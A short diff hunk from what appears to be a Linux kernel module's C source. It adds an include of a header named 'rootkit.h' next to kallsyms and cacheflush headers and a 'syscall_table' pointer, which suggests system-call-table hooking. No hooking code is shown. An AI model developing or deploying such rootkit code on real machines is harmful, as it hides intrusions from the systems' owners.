@@ -10,6 +10,7 @@
 #include <linux/kallsyms.h>
 #include <asm/cacheflush.h>
 #include <asm/page.h>
+#include "rootkit.h"
 
 unsigned long *syscall_table;
 
